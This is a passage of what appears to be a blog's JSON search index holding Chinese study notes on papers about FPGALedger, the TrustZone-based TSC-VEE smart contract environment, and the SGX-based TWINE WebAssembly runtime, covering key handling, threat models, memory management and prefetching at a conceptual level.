-10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g></g></g></g></svg></mjx-container></span>）</strong>：</p>\n<ul>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.355ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.117ex\" height=\"1.926ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 935.6 851.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(554,-150) scale(0.707)\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g></g></g></g></svg></mjx-container></span> 是一个在所有参与 FPGALedger\n系统的 FPGA 设备之间共享的对称密钥。</li>\n<li>在智能合约被解密后，<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.355ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.117ex\" height=\"1.926ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 935.6 851.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(554,-150) scale(0.707)\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g></g></g></g></svg></mjx-container></span>\n被用来对合约进行再次加密，以便安全地将其存储在去中心化账本中。</li>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.355ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.117ex\" height=\"1.926ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 935.6 851.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(554,-150) scale(0.707)\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g></g></g></g></svg></mjx-container></span>\n还用于加密账本中的数据和智能合约执行的结果，确保在传输和存储过程中保持数据的保密性。</li>\n<li>由于 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.355ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.117ex\" height=\"1.926ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 935.6 851.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(554,-150) scale(0.707)\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g></g></g></g></svg></mjx-container></span> 是共享的，所有 FPGA\n设备都可以解密和验证账本中的数据和智能合约的执行结果，以确保系统的完整性和一致性。</li>\n</ul>\n<p>总结：</p>\n<p>用户给FPGA发送信息时，用公钥加密数据，FPGA用私钥解密数据。</p>\n<p>FPGA给FPGA发送信息时，用对称密钥加密数据，其他FPGA可以解密数据。</p>\n<h2 id=\"共识设计\">2.3 共识设计</h2>\n<p>FPGALedger 将共识视为一个独立的层，可以由通用处理器运行。</p>\n<p>当 FPGA\n设备生成交易或接收到交易时，它会将其决策通知指定的共识处理器，处理器再与其他节点通信以运行共识协议。</p>\n<h1 id=\"安全性分析\">3 安全性分析</h1>\n<figure>\n<img src=\"/blockchain/paper-FPGALedger/image-20240904131033260.png\" alt=\"image-20240904131033260\">\n<figcaption aria-hidden=\"true\">image-20240904131033260</figcaption>\n</figure>\n<p><strong>智能合约及相关数据的保护</strong>：</p>\n<ul>\n<li>智能合约及其相关数据首先通过共享对称密钥（Shared Symmetric\nKey）进行加密保护。这确保了数据在存储和传输过程中不会被未经授权的实体访问。</li>\n</ul>\n<p><strong>共享对称密钥的保护</strong>：</p>\n<ul>\n<li>共享对称密钥（Shared Symmetric Key）通过每个 FPGA 设备的私钥（FPGA\nPrivate\nKey）进行加密保护。这个私钥嵌入在比特流中，并通过比特流加密机制得到保护。</li>\n</ul>\n<p><strong>FPGA 私钥的保护</strong>：</p>\n<ul>\n<li>FPGA 设备的私钥通过比特流加密密钥（Bitstream Encryption\nKey）进行保护。这意味着只有指定的 FPGA\n设备才能解密比特流并访问私钥，从而确保整个链条的安全性。</li>\n</ul>\n<h1 id=\"总结\">总结</h1>\n<p>区块链和分布式账本的火爆，使得将区块链作为可提供的云服务成为发展方向。</p>\n<p>区块链作为云服务，存在云服务商能够盗取私密信息的风险，所以需要有办法对数据进行加密。</p>\n<p>用户需要向区块链发送信息，这个信息需要加密，只有区块链能解密 →\n密钥对，用户使用公钥加密，区块使用私钥解密</p>\n<p>私钥如何提供给区块？将私钥嵌入在比特流里，利用比特流加密的机制，保证比特流不能被读取和篡改，且只能由特定的FPGA写入。</p>\n<p>区块需要将信息发送给其他区块，这个信息需要加密，所有其他区块都能解密\n→ 对称秘钥，所有网络中的区块都有这个对称秘钥。</p>\n<p>层层保护使得信息</p>\n","categories":["笔记"],"tags":["FPGA","区块链","以太坊","智能合约","论文"]},{"title":"A TrustZone-Based Smart Contract Virtual Execution Environment 论文笔记","url":"/blockchain/paper-TSC-VEE/","content":"<p>这篇论文影响因子好高，文章也比较长。耐心啃啃学习一下。</p>\n<p>讲的是一种基于TrustZone的智能合约的虚拟执行环境。</p>\n<p>我还不知道什么是可信执行环境TrustZone，总之听起来很安全。并且本文验证了这种方法比Geth性能更好。</p>\n<p>本文先学习TrustZone的原理，然后精读这篇论文。</p>\n<span id=\"more\"></span>\n<h1 id=\"trustzone\">TrustZone</h1>\n<p>参考资料：https://www.bilibili.com/read/cv29524904/</p>\n<h2 id=\"目标\">目标</h2>\n<p>一句话概括：TrustZone的目的是提高嵌入式设备的安全性。</p>\n<p>那么，传统的嵌入式设备，哪里不安全？传统的方法是怎么解决安全问题的？</p>\n<h3 id=\"传统方法与问题\">传统方法与问题</h3>\n<p>CPU\n通过内存映射手段给每个进程营造一个单独的地址空间来隔离多个进程的代码和数据，通过内核空间和用户空间不同的特权级来隔离操作系统和用户进程的代码和数据。但由于内存中的代码和数据都是明文，容易被同处于内存中的其它应用偷窥\n。</p>\n<p>为了解决这个问题，传统的方案有：</p>\n<ul>\n<li><p><strong>外部挂接硬件安全模块</strong>：使用外置的SIM卡、U盘等外部硬件加解密模块</p>\n<p>问题：</p>\n<ol type=\"1\">\n<li>外部模块与主芯片之间会通信，这个通信线路暴露在外部，可以被破解监听；</li>\n<li>通信速率低</li>\n</ol></li>\n<li><p><strong>内部集成硬件安全模块</strong>：集成到芯片内部，一个芯片两个核：普通核与安全核</p>\n<p>问题：</p>\n<ol type=\"1\">\n<li>核之间通信速率仍然很低</li>\n<li>性能有限、成本较高、占用SoC（System on Chip）面积</li>\n</ol></li>\n</ul>\n<h2 id=\"trustzone解决方案\">TrustZone解决方案</h2>\n<p>并不是使用独立的安全模块，而是将每个核<strong>虚拟为两个核</strong>，好比在一个CPU里集成两个操作系统：</p>\n<ul>\n<li>一个非安全核（Non-secure Core, NS\nCore），运行非安全世界的代码；</li>\n<li>另一个安全核（Secure Core），运行安全世界的代码。</li>\n</ul>\n<p><strong>安全世界</strong>（Secure\nWorld）和<strong>非安全世界</strong>（Non-secure\nWorld）是TrustZone抽象出的概念</p>\n<ul>\n<li>需要保密的操作在安全世界中执行，普通操作在非安全世界中执行；</li>\n<li>安全世界可以访问非安全世界的资源，非安全世界不能访问安全世界的资源。</li>\n<li>这两个世界通过<strong>时间片轮转</strong>的方式交替占用物理核，通过\n<strong>Monitor Mode</strong> 进行转换。</li>\n</ul>\n<p>原先我想先学习仔细学习TrustZone和他的实现方案的，但是内容过多，并且论文中也会部分讲解部分内容，不在此单独学习TrustZone了，有需要以后会单独开一篇文章。</p>\n<h2 id=\"trustzonetsc-vee-和-op-tee\">TrustZone、TSC-VEE 和 OP-TEE</h2>\n<p>TrustZone、TSC-VEE 和 OP-TEE 之间的关系如下：</p>\n<ol type=\"1\">\n<li><strong>TrustZone</strong>：TrustZone 是 ARM\n处理器中的一种安全架构，它提供了两个隔离的执行环境：安全世界（Secure\nWorld）和普通世界（Normal World）。TrustZone\n通过硬件强制隔离机制，确保普通世界无法访问安全世界的资源。TrustZone\n是整个系统的底层基础，负责提供硬件级别的安全和隔离环境。</li>\n<li><strong>OP-TEE</strong>：OP-TEE 是一个在 TrustZone\n上运行的开源安全操作系统，专门为 ARM\n处理器设计。它提供了运行在安全世界中的操作系统功能，并支持开发和运行可信应用程序（Trusted\nApplications, TAs）。OP-TEE 通过提供 API，使得普通世界（例如运行\nLinux）中的应用程序可以安全地与安全世界中的应用程序进行通信。</li>\n<li><strong>TSC-VEE</strong>：TSC-VEE 是一个专门为 TrustZone\n设计的虚拟执行环境，它运行在 OP-TEE 上，旨在支持 Solidity 智能合约在\nTrustZone 上的执行。TSC-VEE 利用了 OP-TEE 提供的安全功能和 TrustZone\n的硬件隔离机制，为智能合约提供了一个安全高效的执行环境。TSC-VEE\n通过动态内存管理和优化指令集等机制，克服了在 TrustZone\n上运行智能合约时的内存和性能限制。</li>\n</ol>\n<h1 id=\"简介\">1 简介</h1>\n<p>本文的主要动机在于解决将主流智能合约迁移到ARM\nTrustZone上执行的困难。现有智能合约通常使用Solidity编写，而TrustZone的执行环境主要支持C语言，缺乏支持智能合约所需的虚拟执行环境。这导致了现有智能合约无法直接迁移到TrustZone上执行，从而限制了在嵌入式设备和云服务器上利用TrustZone保护智能合约的潜力。</p>\n<p>为应对这一挑战，本文提出并设计了一个名为TSC-VEE的新虚拟执行环境，旨在支持在TrustZone上执行用Solidity编写的智能合约。具体的贡献包括：</p>\n<ol type=\"1\">\n<li><strong>指令集设计</strong>：设计了特定的指令集，支持在TrustZone上执行Solidity智能合约。</li>\n<li><strong>运行时内存管理机制</strong>：提出了一种新的运行时内存管理机制，显著减少了内存占用，同时保持低延迟。</li>\n<li><strong>混合粒度字节码分析</strong>：通过预执行字节码来减少运行时检测次数，从而降低了执行延迟。</li>\n<li><strong>跨隔离环境预取方法</strong>：设计了一种方法，提前加载并存储区块链数据，减少了智能合约执行时的延迟。</li>\n<li><strong>性能验证</strong>：在Raspberry Pi\n3B+上实现并验证了TSC-VEE，展示了其在执行性能上的显著提升。</li>\n</ol>\n<h1 id=\"挑战\">2 挑战</h1>\n<p>https://chatgpt.com/c/bd659cf1-4e63-41d2-a6b0-6d8a48bcb185</p>\n<p><strong>指令集与执行机制的匹配</strong>：现有的 Solidity\n指令集和解释器无法直接适应 TrustZone\n的执行机制，特别是跨世界的数据访问会导致显著的延迟。</p>\n<p><strong>内存资源限制</strong>：TrustZone\n上可用的安全内存资源有限，而智能合约执行过程中内存需求不断增加，可能导致内存不足，进而导致合约执行失败。</p>\n<p><strong>频繁的资源检测</strong>：在智能合约执行过程中，频繁的资源检测会增加执行延迟，并在异常（如堆栈溢出或\ngas 耗尽）发生时使执行无效。</p>\n<h1 id=\"设计\">3 设计</h1>\n<h2 id=\"威胁模型threat-model\">3.1 威胁模型（Threat Model）</h2>\n<p>假设：</p>\n<ul>\n<li>所有TrustZone的软件组件都是可信的</li>\n<li>普通世界中的操作系统和用户空间是不可信的</li>\n<li>数据的传输是可信的</li>\n</ul>\n<p>因此，TSC-VEE\n可以在<strong>从输入数据到输出结果</strong>的整个智能合约执行过程中提供安全保护。</p>\n<p>针对 TrustZone 本身的攻击，和以太坊上的回滚攻击，不在TSC-VEE</p>\n<h2 id=\"架构概述\">3.2 架构概述</h2>\n<p><strong>数据区</strong>：包括堆栈和工作内存。堆栈是一个操作数堆栈，负责存储执行过程中需要的操作数，字长为\n256\n位。工作内存负责存储各种类型的数据和运行时的返回值。在作为操作数使用之前，工作内存中的运行时数据和区块链存储中的状态数据将首先被加载到堆栈中。</p>\n<p><strong>指令集</strong>：包含 TSC-VEE 支持的所有指令。TSC-VEE\n提供一个跳转表，记录从操作码到操作或从操作到指令函数的对应关系。</p>\n<p><strong>指令解释器</strong>：是 TSC-VEE\n的核心，负责智能合约的字节码解释和执行。解释器由四个主要执行阶段组成：</p>\n<ol type=\"1\">\n<li><strong>取指阶段</strong>：程序计数器从存储在 TEE\n侧的输入字节码中提取操作码，操作码是一个两位的十六进制数。</li>\n<li><strong>解码阶段</strong>：根据指令集的跳转表，解释器将操作码转换为操作。</li>\n<li><strong>分析阶段</strong>：解释器通过字节码预执行来分析指令的堆栈需求和静态\ngas\n成本。分析结果被缓存到共享内存中，以供解释器访问，并避免增加安全内存占用。在分析阶段，每条指令的相应函数、某些特殊类型指令的参数以及字节码块的跳转目标将被记录，并用作下一执行阶段的输入数据。这三个阶段将重复进行，直到所有字节码加载完成。</li>\n<li><strong>执行阶段</strong>：解释器根据记录顺序执行指令，动态修正 gas\n成本，然后返回执行结果。</li>\n</ol>\n<figure>\n<img src=\"/blockchain/paper-TSC-VEE/image-20240907130854787.png\" alt=\"image-20240907130854787\">\n<figcaption aria-hidden=\"true\">image-20240907130854787</figcaption>\n</figure>\n<h2 id=\"专用指令集\">3.3 专用指令集</h2>\n<blockquote>\n<p>挑战：</p>\n<p><strong>指令集与执行机制的匹配</strong>：现有的 Solidity\n指令集和解释器无法直接适应 TrustZone\n的执行机制，特别是跨世界的数据访问会导致显著的延迟。</p>\n</blockquote>\n<p>这些指令基于 Solidity 的原生指令集，但其底层解释已被重构，以适应\nTrustZone 和 OP-TEE 机制，从而支持主流智能合约。</p>\n<ol type=\"1\">\n<li><strong>算术指令</strong>：包括四种算术运算、模运算和用于 256\n位操作数的指数运算。这些指令从堆栈顶部弹出两个或三个操作数，进行计算，然后将结果压入堆栈。</li>\n<li><strong>比较指令</strong>：包括数据大小比较和布尔运算，用于操作数比较和跳转目标判断等。</li>\n<li><strong>加密指令</strong>：SHA3 负责区块链的哈希计算。</li>\n<li><strong>Clusterstate\n指令</strong>：主要负责获取附加数据，包括交易发起时的发送者、输入数据和其他参数。</li>\n<li><strong>存储指令</strong>：包括从堆栈顶部弹出操作数，以及在堆栈和\nTSC-VEE 工作内存之间或堆栈和 TSC-VEE 存储之间的数据移动。</li>\n<li><strong>执行指令</strong>：主要包括跳转指令，以及获取当前程序计数器、内存大小和剩余\ngas 的指令。跳转指令负责处理执行流程的跳转和验证。</li>\n<li><strong>堆栈指令</strong>：包括三种类型。PUSHx 指令将 X 字节（1-32\n字节）的数据推送到堆栈顶部。DUPx 指令复制堆栈的第 X 个（第 1 到第 16\n个）数据，并将其推送到堆栈顶部。SWAPx 指令将堆栈顶部元素与第 X 个（第 1\n到第 16 个）元素交换。</li>\n<li><strong>日志指令</strong>：用于将不同长度的日志存储在区块链 StateDB\n中。</li>\n<li><strong>Cluster\n指令</strong>：包括不同的合约调用模式指令和返回指令。</li>\n<li><strong>RMM\n指令</strong>：包括一对指令，用于创建内存指针和释放内存，以完成 RMM\n机制。</li>\n</ol>\n<h2 id=\"运行时内存管理-rmm\">3.4 运行时内存管理 RMM</h2>\n<blockquote>\n<p>挑战：</p>\n<p><strong>内存资源限制</strong>：TrustZone\n上可用的安全内存资源有限，而智能合约执行过程中内存需求不断增加，可能导致内存不足，进而导致合约执行失败。</p>\n</blockquote>\n<p>Solidity 提供了两个关键词，<code>storage</code> 和\n<code>memory</code>，用于指定变量类型。<code>storage</code>\n类型的变量将持久存储在区块链的 stateDB 中，而 <code>memory</code>\n类型的变量将暂时存储在工作内存中，并且在执行结束前不会释放。为了避免持久存储带来的高\ngas 消耗，合约中的大部分数据都被定义为 <code>memory</code>\n类型。然而，这些数据会随着合约的执行，使工作内存（即 TrustZone\n上的安全内存）的占用持续增长。这使得在 TrustZone 上执行 Solidity\n智能合约变得具有挑战性，因为内存资源有限。</p>\n<p>再次强调一遍，TrustZone是一个硬件架构，分为安全世界和非安全世界。OP-TEE\nOS是一个可信执行环境的操作系统，这个操作系统运行在TrustZone的安全世界中。</p>\n<p>本文实现的TSC-VEE是一个可信智能合约的虚拟执行环境，本质上是一个TA（可信应用程序），运行在OP-TEE\nOS上。</p>\n<p>智能合约的运算过程中会有大量的内存资源使用，而TrustZone中的内存空间有限，所以必须有一种方式合理的管理内存空间。</p>\n<figure>\n<img src=\"/blockchain/paper-TSC-VEE/image-20240908140541329.png\" alt=\"image-20240908140541329\">\n<figcaption aria-hidden=\"true\">image-20240908140541329</figcaption>\n</figure>\n<h3 id=\"内存分配\">内存分配</h3>\n<ol type=\"1\">\n<li>当 <code>VM_RAM</code> 的剩余内存充足时，按需扩展工作内存区域。</li>\n<li>当剩余内存无法满足要求时，合并内存池中的连续区域，然后找到合适大小的区域。</li>\n<li>如果内存池中也没有可用区域，则将 <code>VM_RAM</code>\n起始地址的一定大小的数据移动到共享内存，然后释放该区域。</li>\n<li>重复步骤 1-3，直到满足需求为止。</li>\n</ol>\n<p>和操作系统的运行内存分配方法一样，如果内存真的不够，还会移动一部分到外存。</p>\n<h3 id=\"内存回收\">内存回收</h3>\n<p>在编译阶段，对将来要回收的变量打上标记（MARK），在后续不再使用该变量的时候释放空间（FREE）。</p>\n<figure>\n<img src=\"/blockchain/paper-TSC-VEE/image-20240908140653177.png\" alt=\"image-20240908140653177\">\n<figcaption aria-hidden=\"true\">image-20240908140653177</figcaption>\n</figure>\n<p>原来的方法从来不主动释放空间，有任何变量都不断往栈里面加，直到合约执行完毕。现在的方法是当变量不再被使用后就释放他的空间，因此显著减少了内存空间的占用</p>\n<h2 id=\"混合粒度字节码分析-hgba\">3.5 <strong>混合粒度字节码分析</strong>\nHGBA</h2>\n<blockquote>\n<p>目的：减少运行时对堆栈高度和 gas\n成本的检测次数，从而降低了执行延迟。</p>\n</blockquote>\n<p>在合约执行过程中，会进行堆栈高度和 gas\n成本的检测，以确保执行的正确性。传统上，这种检测是在每条指令执行之前进行的。如此频繁的检测会带来较高的延迟。</p>\n<blockquote>\n<p>什么是粒度？</p>\n<p>“粒度”是指处理或分析某个事物的细化程度、最小单位。</p>\n</blockquote>\n<p>传统上，每条指令执行之前都会进行堆栈高度和 gas\n成本的检测，这个就是<em>指令粒度</em>。</p>\n<p>本文提出的方法是，在<em>合约粒度</em>上分析堆栈高度，在<em>基本块粒度</em>上分析\ngas 成本。在两个不同的粒度上进行分析，因此叫做“混合粒度”。</p>\n<h3 id=\"堆栈高度检测\">堆栈高度检测</h3>\n<p>合约粒度，每个合约执行之前只检测一次。</p>\n<p>因为每个指令会造成的堆栈高度变化是一定的。比如 <code>ADD</code>\n就是先减少2个高度，再增加1个高度。</p>\n<p>提前过一遍所有指令，就能得到堆栈高度的最大值，检查是否超过上限即可。</p>\n<h3 id=\"gas-成本检测\">Gas 成本检测</h3>\n<p>基本块粒度。基本块就是编译原理中的基本块，是指一系列不包含跳转的指令序列。</p>\n<p>Gas 成本会随着运行复杂度而增加。例如一个代码的循环次数非常多，Gas\n成本就会很高。</p>\n<p>每条指令的Gas\n成本是一定的，每个基本块的执行顺序也是一定的，因此可以先计算出每个基本块的总Gas成本，之后执行到这个基本块后，只用检测加入这个基本块之后Gas\n成本是否超限。</p>\n<p>从一个指令一次缩减到一个基本块一次。</p>\n<h2 id=\"跨隔离环境预取-ciep\">3.6 跨隔离环境预取 CIEP</h2>\n<p>CIEP（Cross-Isolation-Environment Prefetching）</p>\n<p>智能合约执行过程中需要获取多种类型的数据，包括输入参数、合约字节码和区块链状态。这些数据都可以从普通世界（REE）侧的交易参数或区块链\nStateDB 中获取。</p>\n<p>跨世界数据加载的过程是一个缓慢的过程：</p>\n<p>没有 CIEP\n时，此操作首先从安全世界切换到普通世界，通过主机应用程序获取数据并将其复制到共享内存，然后再切换回安全世界，从共享内存加载数据，并继续执行，如图中所示的步骤\n1© 2© 3© 4©。跨世界数据存储的过程类似，但顺序相反。一旦解释器遇到 SSTORE\n和 SLOAD 指令，这些耗时操作将在运行时重复执行。</p>\n<p>在 CIEP\n机制下，持久化存储数据可以与其他参数一起在执行前预取，而不是在运行时进行。CIEP\n的过程如下：</p>\n<ol type=\"1\">\n<li>普通世界中的包装器会在执行前从合约调用交易和包含区块链 StateDB\n中持久化存储数据的账户存储树中获取参数。</li>\n<li>所有数据将通过 TSC-VEE 主机应用程序复制到 REE 和 TEE\n之间的共享内存中。</li>\n<li>通过世界切换调用 TSC-VEE TA。</li>\n<li>使用这些数据，TSC-VEE\n解释器可以在不同的执行阶段根据需要从共享内存中获取参数、操作码和存储数据。</li>\n</ol>\n","categories":["笔记"],"tags":["区块链","以太坊","TrustZone","智能合约","论文"]},{"title":"An Embedded Trusted Runtime for WebAssembly 论文笔记","url":"/blockchain/paper-TWINE/","content":"<p>学习论文如何在 TEE 中构造 WebAssembly 运行时。</p>\n<span id=\"more\"></span>\n<h1 id=\"简介\">1 简介</h1>\n<p>TWINE 是一个运行在 SGX 安全环境中的轻量级 WebAssembly\n虚拟机，它允许执行未修改的 WebAssembly 应用程序。它利用 WASI\n接口与外部环境进行交互，并提供加密文件系统操作等功能，从而为应用程序提供安全性。文章评估了\nTWINE 的性能，并与现有技术进行了比较，结果表明 TWINE\n在保证安全性的同时，性能开销可以接受。</p>\n<p>本文提出的贡献如下：</p>\n<ul>\n<li>第一个真正的开源通用 Wasm 运行时环境在 SGX\n隔离区内的实现，并完全支持加密文件系统操作；</li>\n<li>对我们的实现进行了广泛的评估，提供了对其性能成本和相关瓶颈的良好理解；</li>\n<li>提出了改进英特尔受保护文件系统的建议，并展示了由此带来的性能改进。</li>\n</ul>\n<p><img src=\"/blockchain/paper-TWINE/image-20241006134344864.png\" alt=\"image-20241006134344864\" style=\"zoom:50%;\"></p>\n<h1 id=\"相关工作\">2 相关工作</h1>\n<h2 id=\"webassembly-和-tees\">2.1 WebAssembly 和 TEEs</h2>\n<ul>\n<li>AccTEE：在 Intel SGX 隔离区内运行 Wasm\n二进制文件。其双向沙箱与本文的方法类似，缺少IPFS的支持（但是本文实现了IPFS）</li>\n<li>Se-Lambda： 在 SGX\n隔离区内运行无服务器应用程序（FaaS），并提供防篡改和完整性保证。</li>\n<li>Enarx： 旨在在 SGX 隔离区内运行语言无关的二进制文件。</li>\n</ul>\n<h2 id=\"将语言运行时嵌入-tees\">2.2 将语言运行时嵌入 TEEs</h2>\n<ul>\n<li>Mesapy： 在 TEE 内运行 Python 程序，并使用 PyPy\n作为运行时环境。</li>\n<li>Civet： 在 TEE 内运行 Java 程序，并使用 JikesRVM\n作为运行时环境。</li>\n<li>TrustJS： 在 TEE 内运行 JavaScript 程序，并使用 Node.js\n作为运行时环境。</li>\n</ul>\n<h2 id=\"数据库与-tees\">2.3 数据库与 TEEs</h2>\n<ul>\n<li>CryptSQLite： 在 SGX 隔离区内运行\nSQLite，并使用对称加密机制保护数据。</li>\n<li>SQLite drop-in alternatives： 使用对称加密或特定安全扩展来保护数据的\nSQLite 替代方案。</li>\n<li>EnclaveDB： 基于 Hekaton 的安全数据库引擎，使用 SGX\n隔离区和可信通道来保护数据。</li>\n<li>Always Encrypted： 扩展 Microsoft SQL Server，以在 TEE\n内外始终加密数据。</li>\n<li>StealthDB： 基于 PostgreSQL 的安全数据库，使用 SGX\n隔离区和加密数据类型来保护数据。</li>\n</ul>\n<h1 id=\"wasm-可信运行时实现\">3 Wasm 可信运行时实现</h1>\n<p>主要由两个模块组成：Wasm Runtime 和 WASI</p>\n<p><img 